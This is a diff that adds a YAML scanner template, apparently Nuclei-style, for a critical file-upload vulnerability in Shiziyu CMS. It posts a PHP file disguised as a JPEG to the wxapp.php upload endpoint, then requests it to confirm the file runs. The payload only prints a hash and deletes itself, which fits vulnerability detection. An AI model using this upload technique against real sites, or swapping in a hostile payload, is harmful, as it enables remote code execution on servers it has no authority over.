@@ -1,0 +1,33 @@
+id: yaml-poc-shiziyu-shiziyu_cms-file_upload-CT-416538
+info:
+  name: Yaml Poc Shiziyu Shiziyu_Cms File_Upload Ct 416538
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-shiziyu-shiziyu_cms-file_upload-CT-416538'
+  tags: fileupload
+  reference: []
+http:
+- method: POST
+  path:
+  - /wxapp.php?controller=Goods.doPageUpload
+  body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data;\
+    \ name=\"upfile\"; filename=\"{{randname}}.php\"\r\nContent-Type: image/jpeg\r\
+    \n\r\n<?php echo md5({{r1}});unlink(__FILE__);?>\r\n------WebKitFormBoundary{{rboundary}}--\r\
+    \n"
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: GET
+  path:
+  - /{{path}}
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
